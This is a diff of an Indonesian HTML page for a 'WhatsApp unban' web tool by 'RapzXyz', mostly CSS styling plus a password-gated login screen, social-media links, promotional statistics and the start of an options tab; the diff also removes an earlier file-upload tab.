@@ -6,18 +6,395 @@
     <title>Unband WhatsApp By-RapzXyz</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Semua kode CSS sebelumnya tetap sama */
-        /* ... */
-        
-        /* CSS untuk fitur pengunggahan foto & video */
-        .upload-container {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
-        .upload-title {
+        :root {
+            --primary: #1e3a8a;
+            --primary-dark: #1e40af;
+            --secondary: #7f1d1d;
+            --accent: #dc2626;
+            --accent-purple: #9c27b0;
+            --accent-orange: #ff9800;
+            --accent-pink: #e91e63;
+            --glass: rgba(0, 0, 0, 0.4);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            --dark-bg: #0f0f0f;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+            color: white;
+        }
+        
+        /* Background dengan bintang */
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+        }
+        
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: twinkle var(--duration, 5s) infinite ease-in-out;
+        }
+        
+        /* Bintang Jatuh */
+        .falling-star {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: white;
+            border-radius: 50%;
+            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
+            z-index: -1;
+            opacity: 0;
+        }
+        
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.2; }
+            50% { opacity: 1; }
+        }
+        
+        @keyframes fallingStar {
+            0% {
+                opacity: 0;
+                transform: translateX(0) translateY(0);
+            }
+            10% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: translateX(100px) translateY(100px);
+            }
+        }
+        
+        /* Efek Petir */
+        .lightning {
+            position: absolute;
+            width: 3px;
+            height: 0;
+            background: linear-gradient(to bottom, rgba(30, 58, 138, 0.8), rgba(220, 38, 38, 0.8), rgba(15, 15, 15, 0.8));
+            opacity: 0;
+            z-index: -1;
+            filter: blur(1px);
+        }
+        
+        @keyframes lightning {
+            0% { height: 0; opacity: 0; }
+            10% { height: 50px; opacity: 0.8; }
+            20% { height: 100px; opacity: 0.9; }
+            30% { height: 150px; opacity: 1; }
+            40% { height: 200px; opacity: 0.9; }
+            50% { height: 250px; opacity: 0.8; }
+            60% { height: 200px; opacity: 0.7; }
+            70% { height: 150px; opacity: 0.6; }
+            80% { height: 100px; opacity: 0.5; }
+            90% { height: 50px; opacity: 0.4; }
+            100% { height: 0; opacity: 0; }
+        }
+        
+        /* Planet */
+        .planet {
+            position: absolute;
+            border-radius: 50%;
+            z-index: -1;
+        }
+        
+        .planet-1 {
+            width: 150px;
+            height: 150px;
+            background: radial-gradient(circle at 30% 30%, #1e3a8a, #0f0f0f);
+            top: 10%;
+            right: 10%;
+            box-shadow: 0 0 40px rgba(30, 58, 138, 0.5);
+            animation: float 25s infinite linear;
+        }
+        
+        .planet-2 {
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle at 30% 30%, #dc2626, #7f1d1d);
+            bottom: 15%;
+            left: 8%;
+            box-shadow: 0 0 30px rgba(220, 38, 38, 0.5);
+            animation: float 20s infinite linear reverse;
+        }
+        
+        .planet-3 {
+            width: 80px;
+            height: 80px;
+            background: radial-gradient(circle at 30% 30%, #374151, #0f0f0f);
+            top: 60%;
+            right: 20%;
+            box-shadow: 0 0 25px rgba(55, 65, 81, 0.5);
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: rotate(0deg) translateX(20px) rotate(0deg); }
+            100% { transform: rotate(360deg) translateX(20px) rotate(-360deg); }
+        }
+        
+        .container {
+            background: var(--glass);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 450px;
+            padding: 30px;
+            text-align: center;
+            color: white;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(30, 58, 138, 0.1) 0%, rgba(220, 38, 38, 0.05) 50%, rgba(0,0,0,0) 70%);
+            z-index: -1;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+        
+        h1 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 26px;
+            font-weight: 600;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(90deg, #ffffff, #1e3a8a, #dc2626);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .logo {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #1e3a8a, #dc2626, #0f0f0f);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 40px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .logo::after {
+            content: '';
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
+            transform: rotate(45deg);
+            top: -50%;
+            left: -50%;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: white;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            color: white;
+        }
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        input:focus {
+            border-color: #1e3a8a;
+            outline: none;
+            background: rgba(0, 0, 0, 0.4);
+            box-shadow: 0 0 0 3px rgba(30, 58, 138, 0.3);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #1e3a8a, #dc2626);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 14px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-bottom: 15px;
+            font-weight: 500;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(30, 58, 138, 0.4);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(30, 58, 138, 0.6);
+        }
+        
+        .btn-secondary {
+            background: rgba(0, 0, 0, 0.3);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        
+        .btn-purple {
+            background: linear-gradient(135deg, var(--accent-purple), #6a1b9a);
+        }
+        
+        .btn-orange {
+            background: linear-gradient(135deg, var(--accent-orange), #e65100);
+        }
+        
+        .btn-blue {
+            background: linear-gradient(135deg, #1e3a8a, #1e40af);
+        }
+        
+        .btn-red {
+            background: linear-gradient(135deg, #dc2626, #7f1d1d);
+        }
+        
+        .btn-dark {
+            background: linear-gradient(135deg, #0f0f0f, #374151);
+        }
+        
+        .options {
+            display: none;
+            margin-top: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .option-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .option-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: white;
+        }
+        
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .radio-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .radio-option:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        
+        .radio-option input {
+            width: auto;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            margin-top: 10px;
+            display: none;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border-left: 3px solid #ff6b6b;
+        }
+        
+        .success {
+            color: #25d366;
+            margin-top: 10px;
+            display: none;
+            background: rgba(37, 211, 102, 0.1);
+            padding: 10px;
+            border-radius: 8px;
+            border-left: 3px solid #25d366;
+        }
+        
+        .feature-section {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .feature-title {
             font-weight: 600;
             margin-bottom: 15px;
             color: white;
@@ -27,205 +404,686 @@
             gap: 8px;
         }
         
-        .upload-area {
-            border: 2px dashed rgba(255, 255, 255, 0.3);
-            border-radius: 10px;
-            padding: 25px 15px;
-            text-align: center;
-            margin-bottom: 15px;
-            transition: all 0.3s ease;
-            background: rgba(0, 0, 0, 0.2);
-            cursor: pointer;
-        }
-        
-        .upload-area.highlight {
-            background: rgba(30, 58, 138, 0.2);
-            border-color: #1e3a8a;
-        }
-        
-        .upload-icon {
-            font-size: 40px;
-            color: #1e3a8a;
-            margin-bottom: 10px;
-        }
-        
-        .upload-text {
-            margin-bottom: 15px;
-            color: rgba(255, 255, 255, 0.8);
-        }
-        
-        .file-input {
-            display: none;
-        }
-        
-        .file-label {
-            display: inline-block;
-            background: linear-gradient(135deg, #1e3a8a, #dc2626);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-        
-        .file-label:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(30, 58, 138, 0.4);
-        }
-        
-        .file-info {
-            margin-top: 10px;
-            font-size: 0.85rem;
-            color: rgba(255, 255, 255, 0.6);
-        }
-        
-        .url-selection {
-            margin-bottom: 15px;
-        }
-        
-        .url-title {
-            font-size: 1rem;
-            margin-bottom: 10px;
-            color: rgba(255, 255, 255, 0.9);
-        }
-        
-        .url-options {
-            display: flex;
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 10px;
-            flex-wrap: wrap;
         }
         
-        .url-option {
-            flex: 1;
-            min-width: 120px;
-        }
-        
-        .url-option input {
-            display: none;
-        }
-        
-        .url-label {
-            display: block;
+        .feature-item {
+            background: rgba(0, 0, 0, 0.3);
             padding: 12px;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
+            border-radius: 10px;
             text-align: center;
+            transition: all 0.3s;
             cursor: pointer;
-            transition: all 0.3s ease;
-            background: rgba(0, 0, 0, 0.2);
         }
         
-        .url-label:hover {
-            border-color: #1e3a8a;
+        .feature-item:hover {
+            background: rgba(0, 0, 0, 0.4);
+            transform: translateY(-3px);
         }
         
-        .url-option input:checked + .url-label {
-            border-color: #1e3a8a;
-            background: rgba(30, 58, 138, 0.2);
-            box-shadow: 0 0 0 2px rgba(30, 58, 138, 0.3);
-        }
-        
-        .url-name {
-            font-weight: 600;
+        .feature-icon {
+            font-size: 20px;
             margin-bottom: 5px;
             color: #1e3a8a;
         }
         
-        .url-desc {
-            font-size: 0.8rem;
-            color: rgba(255, 255, 255, 0.6);
+        .feature-text {
+            font-size: 12px;
         }
         
-        .upload-btn {
-            display: block;
+        .status-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .status-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
             width: 100%;
-            background: linear-gradient(135deg, #1e3a8a, #dc2626);
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 1rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 15px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.2);
+            z-index: 1;
         }
         
-        .upload-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(30, 58, 138, 0.4);
+        .status-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            position: relative;
+            z-index: 2;
         }
         
-        .upload-btn:disabled {
-            background: rgba(255, 255, 255, 0.1);
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .status-step.active {
+            background: #1e3a8a;
+            box-shadow: 0 0 0 3px rgba(30, 58, 138, 0.3);
         }
         
-        .upload-result {
-            margin-top: 15px;
+        .status-label {
+            position: absolute;
+            top: 35px;
+            font-size: 10px;
+            width: 70px;
+            text-align: center;
+            left: -20px;
+        }
+        
+        .history-item {
+            background: rgba(0, 0, 0, 0.3);
             padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        
+        .history-date {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 5px;
+        }
+        
+        .history-status {
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .status-pending {
+            color: #ffa502;
+        }
+        
+        .status-success {
+            color: #25d366;
+        }
+        
+        .status-failed {
+            color: #ff6b6b;
+        }
+        
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            padding: 5px;
+        }
+        
+        .tab {
+            flex: 1;
+            padding: 10px;
+            text-align: center;
+            cursor: pointer;
             border-radius: 8px;
+            transition: all 0.3s;
+        }
+        
+        .tab.active {
+            background: #1e3a8a;
+        }
+        
+        .tab-content {
             display: none;
         }
         
-        .upload-result.success {
-            background: rgba(37, 211, 102, 0.1);
-            border: 1px solid rgba(37, 211, 102, 0.3);
+        .tab-content.active {
             display: block;
+            animation: fadeIn 0.5s ease;
         }
         
-        .upload-result.error {
-            background: rgba(255, 107, 107, 0.1);
-            border: 1px solid rgba(255, 107, 107, 0.3);
-            display: block;
+        .faq-item {
+            margin-bottom: 15px;
+            text-align: left;
         }
         
-        .result-title {
+        .faq-question {
             font-weight: 600;
-            margin-bottom: 8px;
-            color: white;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
-        .result-url {
-            word-break: break-all;
-            margin-bottom: 10px;
+        .faq-answer {
+            font-size: 14px;
             color: rgba(255, 255, 255, 0.8);
-            font-size: 0.9rem;
+            padding-left: 25px;
         }
         
-        .copy-btn {
-            background: rgba(0, 0, 0, 0.3);
+        /* Fitur Baru: Statistik */
+        .stats-container {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        
+        .stat-item {
+            text-align: center;
+            flex: 1;
+            padding: 10px;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1e3a8a;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        /* Fitur Baru: Progress Bar */
+        .progress-container {
+            margin: 20px 0;
+        }
+        
+        .progress-bar {
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #1e3a8a, #dc2626);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 1s ease;
+        }
+        
+        .progress-text {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 5px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        /* Fitur Baru: Notifikasi */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
             color: white;
-            border: none;
-            padding: 6px 12px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            transition: background 0.3s ease;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
         }
         
-        .copy-btn:hover {
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification-success {
+            border-left: 4px solid #25d366;
+        }
+        
+        .notification-error {
+            border-left: 4px solid #ff6b6b;
+        }
+        
+        /* Fitur Baru: Dark Mode Toggle */
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            width: 50px;
+            height: 25px;
+            border-radius: 25px;
+            display: flex;
+            align-items: center;
+            padding: 0 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .theme-toggle::before {
+            content: '';
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: white;
+            transition: all 0.3s;
+        }
+        
+        .theme-toggle.active::before {
+            transform: translateX(25px);
+        }
+        
+        /* Kontak Developer */
+        .contact-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .contact-btn {
+            flex: 1;
+            padding: 10px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+        
+        .contact-btn.whatsapp {
+            background: #25d366;
+        }
+        
+        .contact-btn.telegram {
+            background: #0088cc;
+        }
+        
+        .contact-btn.tiktok {
+            background: #000000;
+        }
+        
+        .contact-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        /* Kata-kata Random */
+        .quote-container {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .quote-text {
+            font-style: italic;
+            margin-bottom: 10px;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .quote-genre {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 10px;
+        }
+        
+        /* Fitur Baru: Informasi Baterai */
+        .battery-info {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .battery-level {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #1e3a8a;
+        }
+        
+        .battery-status {
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        /* Fitur Baru: Voice Intro */
+        .voice-intro {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .voice-controls {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 10px;
+        }
+        
+        .voice-btn {
+            padding: 8px 15px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .voice-btn:hover {
             background: rgba(0, 0, 0, 0.4);
         }
         
-        /* Responsif untuk fitur upload */
+        .fun-features {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .fun-btn {
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .fun-btn:hover {
+            background: rgba(0, 0, 0, 0.4);
+            transform: translateY(-3px);
+        }
+        
+        .fun-icon {
+            font-size: 20px;
+        }
+        
+        /* Fitur Penghapus Background */
+        .background-remover {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .bg-remover-title {
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .bg-remover-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .bg-remover-preview {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+        
+        .bg-remover-canvas-container {
+            flex: 1;
+            border-radius: 8px;
+            overflow: hidden;
+            background: rgba(0, 0, 0, 0.2);
+            min-height: 150px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .bg-remover-canvas {
+            max-width: 100%;
+            max-height: 150px;
+        }
+        
+        .bg-remover-controls {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .bg-remover-btn {
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: none;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+        
+        .bg-remover-btn:hover {
+            background: rgba(0, 0, 0, 0.4);
+        }
+        
+        .bg-remover-btn.primary {
+            background: linear-gradient(135deg, #1e3a8a, #dc2626);
+        }
+        
+        .bg-remover-btn.primary:hover {
+            background: linear-gradient(135deg, #1e40af, #b91c1c);
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(30, 58, 138, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(30, 58, 138, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(30, 58, 138, 0); }
+        }
+        
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        
+        @keyframes floating {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        /* Responsif */
         @media (max-width: 480px) {
-            .url-options {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 22px;
+            }
+            
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .stats-container {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .contact-buttons {
                 flex-direction: column;
             }
             
-            .upload-area {
-                padding: 20px 10px;
+            .fun-features {
+                grid-template-columns: 1fr;
+            }
+            
+            .bg-remover-preview {
+                flex-direction: column;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Semua elemen HTML sebelumnya tetap sama -->
-    <!-- ... -->
+    <!-- Background Bintang -->
+    <div class="stars" id="stars"></div>
+    
+    <!-- Efek Bintang Jatuh -->
+    <div id="fallingStars"></div>
+    
+    <!-- Efek Petir -->
+    <div id="lightningContainer"></div>
+    
+    <!-- Planet -->
+    <div class="planet planet-1"></div>
+    <div class="planet planet-2"></div>
+    <div class="planet planet-3"></div>
+    
+    <!-- Notifikasi -->
+    <div id="notification" class="notification">
+        <i class="fas fa-check-circle" style="color: #25d366;"></i>
+        <span id="notification-text">Pesan notifikasi</span>
+    </div>
+    
+    <!-- Halaman Login -->
+    <div id="loginPage" class="container">
+        <div class="theme-toggle" id="themeToggle"></div>
+        
+        <div class="logo floating">
+            <i class="fab fa-whatsapp"></i>
+        </div>
+        <h1>Unband WhatsApp By-RapzXyz</h1>
+        
+        <!-- Fitur Baru: Voice Intro -->
+        <div class="voice-intro">
+            <div class="feature-title">
+                <i class="fas fa-volume-up"></i> Voice Intro
+            </div>
+            <div class="voice-controls">
+                <button id="playVoiceBtn" class="voice-btn">
+                    <i class="fas fa-play"></i> Putar
+                </button>
+                <button id="stopVoiceBtn" class="voice-btn">
+                    <i class="fas fa-stop"></i> Stop
+                </button>
+            </div>
+        </div>
+        
+        <div class="input-group">
+            <label for="password"><i class="fas fa-key"></i> Masukkan Sandi:</label>
+            <input type="password" id="password" placeholder="Ketik sandi di sini">
+        </div>
+        
+        <button id="loginBtn" class="btn pulse">
+            <i class="fas fa-sign-in-alt"></i> Masuk
+        </button>
+        
+        <!-- Fitur Baru: Button TikTok dan WhatsApp Channel -->
+        <div class="contact-buttons">
+            <a href="https://tiktok.com/@style.fomo34" target="_blank" class="contact-btn tiktok">
+                <i class="fab fa-tiktok"></i> TikTok
+            </a>
+            <a href="https://whatsapp.com/channel/0029Vb6GVqq3QxRt7sn7gE1o" target="_blank" class="contact-btn whatsapp">
+                <i class="fab fa-whatsapp"></i> WhatsApp Channel
+            </a>
+        </div>
+        
+        <button id="joinGroupBtn" class="btn btn-secondary">
+            <i class="fas fa-users"></i> Mau tau sandi nya? join grub ku sini
+        </button>
+        
+        <div id="errorMsg" class="error">
+            <i class="fas fa-exclamation-circle"></i> Sandi salah! Coba lagi.
+        </div>
+        
+        <!-- Fitur Baru: Informasi Baterai -->
+        <div class="battery-info">
+            <div class="feature-title">
+                <i class="fas fa-battery-half"></i> Status Baterai
+            </div>
+            <div class="battery-level" id="batteryLevel">Mengambil data...</div>
+            <div class="battery-status" id="batteryStatus">-</div>
+        </div>
+        
+        <div class="feature-section">
+            <div class="feature-title">
+                <i class="fas fa-star"></i> Fitur Unggulan
+            </div>
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div class="feature-text">Aman & Terpercaya</div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <div class="feature-text">Proses Cepat</div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <i class="fas fa-history"></i>
+                    </div>
+                    <div class="feature-text">Riwayat Permohonan</div>
+                </div>
+                <div class="feature-item">
+                    <div class="feature-icon">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <div class="feature-text">Bantuan 24/7</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Fitur Baru: Statistik -->
+        <div class="feature-section">
+            <div class="feature-title">
+                <i class="fas fa-chart-bar"></i> Statistik Layanan
+            </div>
+            <div class="stats-container">
+                <div class="stat-item">
+                    <div class="stat-value">95%</div>
+                    <div class="stat-label">Tingkat Keberhasilan</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">1.2K</div>
+                    <div class="stat-label">Pengguna Terbantu</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">24/7</div>
+                    <div class="stat-label">Layanan Aktif</div>
+                </div>
+            </div>
+        </div>
+    </div>
     
     <!-- Halaman Utama -->
     <div id="mainPage" class="container" style="display: none;">
@@ -254,213 +1112,1027 @@
             <div class="tab" data-tab="history">Riwayat</div>
             <div class="tab" data-tab="fun">Fun</div>
             <div class="tab" data-tab="tools">Tools</div>
-            <div class="tab" data-tab="upload">Upload</div> <!-- Tab baru untuk upload -->
             <div class="tab" data-tab="bgremover">BG Remover</div>
         </div>
         
         <!-- Tab Unband -->
         <div id="unband-tab" class="tab-content active">
-            <!-- Konten tab unband sebelumnya -->
-            <!-- ... -->
-        </div>
-        
-        <!-- Tab Riwayat -->
-        <div id="history-tab" class="tab-content">
-            <!-- Konten tab riwayat sebelumnya -->
-            <!-- ... -->
-        </div>
-        
-        <!-- Tab Fun Baru -->
-        <div id="fun-tab" class="tab-content">
-            <!-- Konten tab fun sebelumnya -->
-            <!-- ... -->
-        </div>
-        
-        <!-- Tab Tools -->
-        <div id="tools-tab" class="tab-content">
-            <!-- Konten tab tools sebelumnya -->
-            <!-- ... -->
-        </div>
-        
-        <!-- Tab Upload Baru -->
-        <div id="upload-tab" class="tab-content">
-            <div class="upload-container">
-                <div class="upload-title">
-                    <i class="fas fa-cloud-upload-alt"></i> Pengunggah Foto & Video
-                </div>
-                
-                <div class="upload-area" id="uploadArea">
-                    <div class="upload-icon">📁</div>
-                    <p class="upload-text">Seret file ke sini atau klik untuk memilih</p>
-                    <input type="file" id="fileInput" class="file-input" accept="image/*,video/*">
-                    <label for="fileInput" class="file-label">Pilih File</label>
-                    <p class="file-info">Mendukung file gambar (JPG, PNG, GIF) dan video (MP4, MOV, AVI)</p>
-                </div>
-                
-                <div class="url-selection">
-                    <h3 class="url-title">Pilih Tujuan Upload:</h3>
-                    <div class="url-options">
-                        <div class="url-option">
-                            <input type="radio" id="url1" name="urlOption" value="https://c.termai.cc" checked>
-                            <label for="url1" class="url-label">
-                                <div class="url-name">TermAI</div>
-                                <div class="url-desc">https://c.termai.cc</div>
-                            </label>
-                        </div>
-                        <div class="url-option">
-                            <input type="radio" id="url2" name="urlOption" value="https://catbox.moe">
-                            <label for="url2" class="url-label">
-                                <div class="url-name">Catbox</div>
-                                <div class="url-desc">https://catbox.moe</div>
-                            </label>
-                        </div>
+            <div class="options">
+                <div class="option-group">
+                    <div class="option-title">
+                        <i class="fas fa-list-alt"></i> Sebut kan opsi kenon wa mu:
+                    </div>
+                    <div class="radio-group">
+                        <label class="radio-option">
+                            <input type="radio" name="option" value="permanen">
+                            1. Permanen
+                        </label>
